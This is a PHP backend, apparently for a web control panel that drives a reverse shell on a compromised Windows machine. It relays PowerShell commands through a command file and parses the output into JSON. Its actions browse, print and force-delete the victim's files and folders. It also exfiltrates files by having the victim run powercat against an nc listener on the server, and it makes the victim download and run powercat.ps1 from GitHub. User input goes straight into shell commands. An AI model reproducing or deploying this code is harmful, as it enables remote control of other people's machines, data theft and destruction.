<?php
$maxsleep = 5;
$fileTransferPort = 4243;
$outputfile = "../reverseresult";
$powercatFolder = ".";

class File
{
    public $mode;
    public $lastModifiedDay;
    public $lastModifiedTime;
    public $size = 0;
    public $name = "";
}

class DirectoryData
{
    public $directory = ".";
    public $files= array();
    
    public function initFromReverseResult($result) {
        $resAsArray = explode("\n", $result);
        $lines = array();
        foreach($resAsArray as $line){
            $line = rtrim($line);
            if (($line[0] == 'd') || (($line[0] == '-') && ((substr($line, -1) != '-')))){
                $attributes = explode(" ", preg_replace('/\s+/', ' ', $line));
                $lineAsObject = new File;
                $lineAsObject->mode = $attributes[0];
                $lineAsObject->lastModifiedDay = $attributes[1];
                $lineAsObject->lastModifiedTime = $attributes[2];
                $startNameIndice = 3;
                if (($attributes[3] == "AM") || ($attributes[3] == "PM")){
                    $startNameIndice++;
                }
                if ($line[0] != 'd'){
                    $startNameIndice++;
                    $lineAsObject->size = $attributes[$startNameIndice - 1];
                }

                for ($i = $startNameIndice; $i < count($attributes); $i++){
                    $lineAsObject->name .= ($i == $startNameIndice ? "" : " ") . $attributes[$i];
                }

                $lines[] = $lineAsObject;
            }
            if (strpos($line, 'Directory') !== false) {
                $this->directory = trim(str_replace('Directory:', '', $line));
            } else if (strpos($line, 'Répertoire') !== false) {
                error_log("ca passe la");
                $this->directory = trim(str_replace('Répertoire :', '', $line));
                $splitted = explode(':', $line);
                $this->directory = $splitted[1];
                for ($i = 2; $i < count($splitted); $i++){
                    $this->directory .= ':' . $splitted[$i];
                }
                $this->directory = trim($this->directory);
            }
        }
        $this->files = $lines;
    }
}

function mb_basename($path) {
    if (preg_match('@^.*[\\\\/]([^\\\\/]+)$@s', $path, $matches)) {
        return $matches[1];
    } else if (preg_match('@^([^\\\\/]+)$@s', $path, $matches)) {
        return $matches[1];
    }
    return '';
}

function writeToReverseShell($cmd, $outputfile, $maxsleep){
    $newfile = $outputfile . "-old";
    if (!copy($outputfile, $newfile)) {
        echo "La copie $newfile du fichier a échoué...\n";
    }
    
    clearstatcache();
    $mtime = filemtime($outputfile);
    
    $handle = fopen("../cmd/command", 'w') or die('Cannot open file:  '.$my_file);
    fwrite($handle, $cmd);
    fclose($handle);      
    
    $sleepcount = 0;
    clearstatcache();
    
    while ($mtime == filemtime($outputfile) && ($sleepcount < $maxsleep)){
        $sleepcount ++;
        sleep(1);
        clearstatcache();
    }
    
    if ($sleepcount != $maxsleep){  
        // Faire le diff entre fichiers et le retourner
        $fulloutput = file_get_contents($outputfile);
        $oldoutput = file_get_contents($newfile);
        $result = str_replace($oldoutput, "", $fulloutput);
        return $result;
    } else {
        return "Shell took too long to respond";
    }
}

if (isset($_POST['action'])) {
    if(!is_file($outputfile)){
        $myfile = fopen($outputfile, "w+");
    }
    
    switch($_POST['action']){
        case "logs":
            error_log("Received logs action");
            echo file_get_contents($outputfile);
        break;
        
        case "write":
            error_log("Received write action");
            if (isset($_POST['command']) && strcmp($_POST['command'], "") != 0) {
                echo writeToReverseShell($_POST['command'], $outputfile, $maxsleep);
            }
        break;
        
        case "download":
            error_log("Received download action");
            session_write_close();
            $filePath = $_POST['command'];
            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/" . mb_basename($filePath) ." &");
            sleep(1);
            $cmd = 'powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i "' . $filePath . '";';
            error_log($cmd);
            $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
            fwrite($handle, $cmd);
            fclose($handle);  
        break;

        case "downloadZip":
            error_log("Received downloadZip action");
            session_write_close();
            $filePath = $_POST['command'];
            shell_exec("nc -lp " . $fileTransferPort . " > ../tmp/" . mb_basename($filePath) .".zip &");
            sleep(1);
            $cmd = 'Compress-Archive -Path "' . $filePath . '" -DestinationPath "' . $filePath . '.zip"; powercat -d -c ' . $_SERVER['SERVER_ADDR'] . ' -p ' . $fileTransferPort . ' -i "' . $filePath . '.zip"; Remove-Item -Path "' . $filePath . '.zip" -Force;';
            error_log($cmd);
            $handle = fopen("../cmd/command", 'w') or die('Cannot open file: ../cmd/command');
            fwrite($handle, $cmd);
            fclose($handle);  
        break;

        case "go":
            error_log("Received go action");
            $cmd = "cd '" . $_POST['command'] . "'; Get-ChildItem -Force;";
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $jsonData = new DirectoryData;
            $jsonData->initFromReverseResult($result);
            echo json_encode($jsonData);
        break;

        case "parent":
            error_log("Received parent action");
            $cmd = "cd .. ; Get-ChildItem -Force;";
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $jsonData = new DirectoryData;
            $jsonData->initFromReverseResult($result);
            echo json_encode($jsonData);
        break;

        case "delete":
            error_log("Received delete action");
            $cmd = "Remove-Item -Path '" . $_POST['command'] . "' -Force ; Get-ChildItem -Force;";
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $jsonData = new DirectoryData;
            $jsonData->initFromReverseResult($result);
            echo json_encode($jsonData);
        break;
        
        case "deleteFolder":
            error_log("Received deleteFolder action");
            $cmd = "Remove-Item -Path '" . $_POST['command'] . "' -Recurse -Force ; Get-ChildItem -Force;";
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $jsonData = new DirectoryData;
            $jsonData->initFromReverseResult($result);
            echo json_encode($jsonData);
        break;

        case "print":
            error_log("Received print action");
            $cmd = "Get-Content -Path '" . $_POST['command'] . "' -Encoding UTF8;";
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            echo substr($result, 0, strrpos($result, "\n"));
        break;
        
        case "init":
            error_log("Received init action");
            $cmd = '$path=$pwd.path; (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1", "$path\powercat.ps1"); . .\powercat.ps1;';
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $powercatFolder = substr(substr($result, 0, -2), 3);
            echo $result;
        break;

        case "list":
            error_log("Received list action");
            $cmd = "Get-ChildItem -Force;";
            $result = writeToReverseShell($cmd, $outputfile, $maxsleep);
            $jsonData = new DirectoryData;
            $jsonData->initFromReverseResult($result);
            echo json_encode($jsonData);
            $handle = fopen("../test", 'w') or die('Cannot open file: ../cmd/test');
            fwrite($handle, $result);
            fclose($handle);
        break;

        default:
        break;
    }
}
?>